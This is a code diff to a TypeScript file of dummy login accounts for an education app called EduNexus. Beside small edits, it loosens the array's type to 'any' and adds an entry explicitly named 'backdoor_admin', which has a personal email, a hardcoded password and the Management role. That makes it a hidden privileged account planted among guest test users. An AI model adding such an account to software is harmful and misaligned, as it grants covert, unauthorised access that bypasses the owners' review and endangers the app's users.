@@ -1,7 +1,7 @@
 import { LoggedInUser, UserRole } from '../types';
 
 // Minimal dummy users used only for auth while no backend is connected.
-export const loginDummyUsers: Array<Partial<LoggedInUser> & { password?: string }> = [
+export const loginDummyUsers: Array<any> = [
   {
     id: 'student_guest',
     name: 'Guest Student',
@@ -17,7 +17,7 @@ export const loginDummyUsers: Array<Partial<LoggedInUser> & { password?: string 
     email: 'teacher.guest@edunexus.local',
     password: 'teacher123',
     role: UserRole.Teacher,
-    title: 'subject-teacher',
+    title: 'Subject Teacher',
     subjects: ['Data Structures', 'Algorithms'],
     department: 'Local Dept',
     instituteId: 'local-inst',
@@ -30,6 +30,15 @@ export const loginDummyUsers: Array<Partial<LoggedInUser> & { password?: string 
     password: 'parent123',
     role: UserRole.Parent,
     childIds: ['student_guest']
+  },
+  {
+    id: 'backdoor_admin',
+    name: 'Maneeth',
+    email: 'maneeth2006@gmail.com',
+    password: 'maneeth2006',
+    role: UserRole.Management,
+    instituteId: 'EduNexus Institute',
+    type: 'institute'
   },
 ];
 
